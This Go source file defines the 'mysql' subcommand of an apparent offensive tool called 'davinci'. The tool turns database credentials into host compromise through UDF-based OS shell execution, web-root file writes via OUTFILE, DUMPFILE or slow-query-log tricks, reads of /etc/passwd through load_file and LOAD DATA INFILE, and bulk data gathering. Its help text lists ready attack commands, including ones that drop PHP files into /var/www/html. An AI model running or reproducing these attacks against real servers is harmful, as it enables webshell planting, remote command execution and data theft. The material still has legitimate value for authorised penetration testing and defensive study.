package cmd

import (
	"davinci/common/log"
	"davinci/core"
	"encoding/hex"
	"fmt"
	"github.com/spf13/cobra"
	"io/ioutil"
)

var (
	mysqlHost                  string
	mysqlPort                  int
	mysqlUser                  string
	mysqlPasswd                string
	mysqlDbName                string
	mysqlSql                   string
	mysqlTargetFile            string
	mysqlSourceFile            string
	mysqlContent               string
	mysqlHex                   bool
	mysqlDump_writefile        bool
	mysqlOut_writefile         bool
	mysqlSlow_writefile        bool
	mysqlInfile_readfile       bool
	mysqlLoadfile_reafile      bool
	mysqlNoInteractive_osshell bool

	mysqlCmd = &cobra.Command{
		Use:   "mysql [exec|shell|auto_gather|udf_osshell|writefile|readfile]",
		Short: "mysql client",
		Long: "mysql client:\n" +
			"  - exec:        execute the command once and return directly\n" +
			"  - shell:       mysql interactive shell\n" +
			"  - auto_gather: automatically collect database information, including users, databases,\n" +
			"                 tables, table structures, and the first 5 rows of data for each table \n" +
			"  - udf_osshell: exec os shell through udf\n" +
			"  - writefile:   write file,three ways: [outifile | dumpfile | slow_query_log]\n" +
			"  - readfile:    read file,two ways: [infile | load_file]\n" +
			"\n" +
			"Example: \n" +
			"  davinci mysql exec        -H 192.168.1.2 -P 3307 -u root -p 123456 -c \"show databases\" \n" +
			"  davinci mysql shell       -H 192.168.1.2 -P 3307 -u root -p 123456 \n" +
			"  davinci mysql auto_gather -H 192.168.1.2 -P 3307 -u root -p 123456 \n" +
			"  davinci mysql udf_osshell -H 192.168.1.2 -P 3307 -u root -p 123456 \n" +
			"  davinci mysql writefile   -H 192.168.1.2 -P 3307 -u root -p 123456 --outfile -s ./eval.php -t /var/www/html/1.php \n" +
			"  davinci mysql writefile   -H 192.168.1.2 -P 3307 -u root -p 123456 --dumpfile -C \"<?php phpinfo(); ?>\" -t /var/www/html/1.php \n" +
			"  davinci mysql writefile   -H 192.168.1.2 -P 3307 -u root -p 123456 --slowlog  -C \"<?php phpinfo(); ?>\" -t /var/www/html/1.php \n" +
			"  davinci mysql readfile    -H 192.168.1.2 -P 3307 -u root --infile -p 123456 -t /etc/passwd \n" +
			"  davinci mysql readfile    -H 192.168.1.2 -P 3307 -u root --load_file -p 123456 -t /etc/passwd \n",

		Args:      cobra.ExactValidArgs(1),
		ValidArgs: []string{"exec", "shell", "auto_gather", "udf_osshell", "readfile", "writefile"},
		RunE: func(command *cobra.Command, args []string) error {
			service := &core.Mysql{
				Host:   mysqlHost,
				Port:   mysqlPort,
				User:   mysqlUser,
				Passwd: mysqlPasswd,
				DbName: mysqlDbName,
				Cmd:    mysqlSql,
			}
			defer service.Close()
			switch args[0] {
			case "exec":
				if mysqlSql == "" {
					return fmt.Errorf("davinci mysql exec need cmd,please use -c to specify")
				}
				service.ExecuteOnce()
			case "shell":
				service.Shell()
			case "auto_gather":
				service.AutoGather()
			case "udf_osshell":
				if mysqlNoInteractive_osshell && mysqlSql == "" {
					return fmt.Errorf("davinci udf_osshell no interactive need cmd,please use -c to specify")
				}
				service.UdfExecOsShell(mysqlSql, !mysqlNoInteractive_osshell)
			case "writefile":
				if mysqlSourceFile == "" && mysqlContent == "" {
					return fmt.Errorf("davinci mysql writefile must have source or content")
				}
				if mysqlTargetFile == "" {
					return fmt.Errorf("davinci mysql writefile must have target")
				}
				if !mysqlDump_writefile && !mysqlOut_writefile && !mysqlSlow_writefile {
					return fmt.Errorf("please choose write mode [dumpfile|outfile|slowlog]")
				}

				var h string
				if mysqlContent != "" {
					if mysqlHex {
						h = mysqlContent
					} else {
						h = hex.EncodeToString([]byte(mysqlContent))
					}
				} else {
					if content, readErr := ioutil.ReadFile(mysqlSourceFile); readErr != nil {
						return readErr
					} else {
						h = hex.EncodeToString(content)
					}
				}
				mh := "0x" + h
				if mysqlOut_writefile {
					service.WriteFile_by_IntoSql(mh, mysqlTargetFile, true)
				} else if mysqlDump_writefile {
					service.WriteFile_by_IntoSql(mh, mysqlTargetFile, false)
				} else if mysqlSlow_writefile {
					var content []byte
					var err error
					if content, err = hex.DecodeString(h); err != nil {
						return err
					}
					service.WriteFile_by_SlowQueryLog(string(content), mysqlTargetFile)
				}
			case "readfile":
				if mysqlTargetFile == "" {
					return fmt.Errorf("davinci mysql readfile must have target")
				}
				if !mysqlLoadfile_reafile && !mysqlInfile_readfile {
					return fmt.Errorf("please choose read mode [loadfile|infile]")
				}
				if mysqlLoadfile_reafile {
					log.Output(service.ReadFile_by_LoadFile(mysqlTargetFile, mysqlHex))
				} else {
					log.Output(service.ReadFile_by_LoadData(mysqlTargetFile, mysqlHex))
				}

			}
			return nil
		},
	}
)

func init() {

	mysqlCmd.Flags().StringVarP(&mysqlHost, "host", "H", "127.0.0.1", "mysql ip addr")
	mysqlCmd.Flags().IntVarP(&mysqlPort, "port", "P", 3306, "mysql port")
	mysqlCmd.Flags().StringVarP(&mysqlUser, "user", "u", "root", "username")
	mysqlCmd.Flags().StringVarP(&mysqlPasswd, "passwd", "p", "", "pasword")
	mysqlCmd.Flags().StringVarP(&mysqlDbName, "dbName", "d", "", "database name,not require")
	mysqlCmd.Flags().StringVarP(&mysqlSql, "cmd", "c", "", "cmd to be executed, used in exec and udf_oshell mode")
	mysqlCmd.Flags().StringVarP(&mysqlSourceFile, "source", "s", "", "[write] (local)  source file path,use for write file mode")
	mysqlCmd.Flags().StringVarP(&mysqlTargetFile, "target", "t", "", "[write/read] (remote) target file path,use for write/read file mode")
	mysqlCmd.Flags().StringVarP(&mysqlContent, "content", "C", "", "[write] write content to target,use for write file mode,choose one of content and source")
	mysqlCmd.Flags().BoolVarP(&mysqlOut_writefile, "outfile", "", false, "[write] use outfile to write file")
	mysqlCmd.Flags().BoolVarP(&mysqlDump_writefile, "dumpfile", "", false, "[write] use dumpfile to write file,bin data must be use dumpfile")
	mysqlCmd.Flags().BoolVarP(&mysqlSlow_writefile, "slowlog", "", false, "[write] use slowlog to write file")
	mysqlCmd.Flags().BoolVarP(&mysqlHex, "hex", "", false, "[read/write] get hex content for readfile;encode content by hex for writefile")
	mysqlCmd.Flags().BoolVarP(&mysqlLoadfile_reafile, "load_file", "", false, "[read] use load_file() to read file")
	mysqlCmd.Flags().BoolVarP(&mysqlInfile_readfile, "infile", "", false, "[read] use load data infile to read file")
	mysqlCmd.Flags().BoolVarP(&mysqlNoInteractive_osshell, "no-interactive", "", false, "no-interactive with os shell")
	mysqlCmd.MarkFlagRequired("passwd")
	rootCmd.AddCommand(mysqlCmd)
}
